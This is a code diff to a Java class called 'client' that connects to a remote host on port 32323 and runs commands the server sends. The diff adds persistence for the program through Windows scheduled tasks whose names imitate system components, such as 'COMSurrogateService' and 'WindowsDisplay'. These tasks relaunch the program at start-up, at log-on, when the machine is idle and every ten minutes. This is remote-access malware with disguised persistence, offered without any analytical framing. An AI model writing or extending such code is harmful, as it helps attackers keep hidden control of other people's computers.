@@ -14,7 +14,7 @@ public class client {
             loc = client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(); 
             loc=loc.substring(1);
             //Runtime.getRuntime().exec("cmd /c copy " + loc + " o.jar");
-            sock = new Socket("127.0.0.1", 32323);
+            sock = new Socket("10.10.0.136", 32323);
             ps = new PrintStream(sock.getOutputStream());
             din = new BufferedReader(new InputStreamReader(sock.getInputStream()));
             is = sock.getInputStream();
@@ -23,14 +23,21 @@ public class client {
             while(true) {
                 String line = din.readLine();
                 if (line.equals("ps99")) {
-                    Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn WindowsDisplay /tr "+ loc + " /sc MINUTE ");
-                    Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn GraphicsUpdate /tr " + loc + " /sc MINUTE "); 
-                    Process proc3 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn ManagerServiceInv /tr " + loc + " /sc MINUTE ");
+                    Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn WindowsDisplay /tr "+ loc + " /sc ONSTART ");
+                    Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn GraphicsUpdate /tr " + loc + " /sc ONLOGON "); 
+                    Process proc3 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn ManagerServiceInv /tr " + loc + " /sc ONIDLE /i 20");
+                    Process proc4 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn COMSurrogateService /tr " + loc + " /sc MINUTE /mo 10");
+                    //Process proc4 = Runtime.getRuntime().exec("cmd /c echo %username%");
+                    //BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc4.getInputStream()));  
+                    //String username = stdInput.readLine();
+                    //
+                    //Process proc5 = Runtime.getRuntime().exec("cmd /c cp " + loc +  "C:\Users\ " + username + "\AppData\Roaming\Microsoft\Windows\"\Start Menu\"\Programs\Startup");
                 }
                 if (line.equals("ps-99")) {
                     Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn WindowsDisplay /f");
                     Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn GraphicsUpdate /f");
                     Process proc3 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn ManagerServiceInv /f");
+                    Process proc4 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn COMSurrogateService /f");
                 }
                 if (line.equals("sh-99")) {
                     sh=false;
